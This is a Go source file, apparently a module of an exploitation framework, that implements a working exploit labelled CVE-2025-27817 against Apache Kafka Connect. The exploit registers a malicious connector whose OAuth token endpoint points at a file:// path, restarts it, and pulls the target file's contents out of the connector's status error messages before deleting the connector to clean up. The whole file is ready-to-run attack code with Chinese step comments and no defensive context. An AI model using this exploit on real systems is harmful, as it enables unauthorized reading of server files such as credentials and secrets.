package cve_2025_27817

import (
	"appsploit/pkg/utils"
	"fmt"
	"strings"
	"time"
)

func Exploit(baseURL string, kafkaBroker string, filename string) (resp string, err error) {
	// 生成随机连接器名称
	connectorName := fmt.Sprintf("exploit-connector-%d", time.Now().Unix())

	// 创建恶意连接器配置，使用指定的文件路径
	config := fmt.Sprintf(`{
		"name": "%s",
		"config": {
			"connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
			"heartbeats.topic.replication.factor": "1",
			"replication.factor": "1",
			"source.cluster.alias": "source",
			"target.cluster.alias": "target",
			"source.cluster.bootstrap.servers": "%s",
			"target.cluster.bootstrap.servers": "%s",
			"topics": ".*",
			"groups": ".*",
			"sync.group.offsets.enabled": "true",
			"emit.heartbeats.enabled": "true",
			"producer.override.sasl.mechanism": "OAUTHBEARER",
			"producer.override.security.protocol": "SASL_PLAINTEXT",
			"producer.override.sasl.oauthbearer.token.endpoint.url": "file://%s",
			"producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required;",
			"producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler"
		}
	}`, connectorName, kafkaBroker, kafkaBroker, filename)

	httpClient := *utils.Http.Client()
	httpClient.SetHeader("Content-Type", "application/json")

	// 1. 创建连接器
	if _, err := httpClient.SetBody(config).Post(baseURL + "/connectors"); err != nil {
		return "", fmt.Errorf("failed to create connector: %v", err)
	}

	// 等待连接器创建
	time.Sleep(2 * time.Second)

	// 2. 重启连接器
	if _, err := httpClient.Post(baseURL + "/connectors/" + connectorName + "/restart"); err != nil {
		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
		return "", fmt.Errorf("failed to restart connector: %v", err)
	}

	// 等待连接器处理
	time.Sleep(5 * time.Second)

	// 3. 获取状态并提取文件内容
	if statusResp, err := httpClient.Get(baseURL + "/connectors/" + connectorName + "/status"); err != nil {
		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
		return "", fmt.Errorf("failed to get connector status: %v", err)
	} else {
		result := statusResp.String()

		// 尝试从错误消息中提取文件内容
		// Kafka Connect 会在错误信息中暴露文件内容
		if strings.Contains(result, "trace") || strings.Contains(result, "message") {
			// 清理连接器
			httpClient.Delete(baseURL + "/connectors/" + connectorName)
			return result, nil
		}

		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
		return result, nil
	}
}
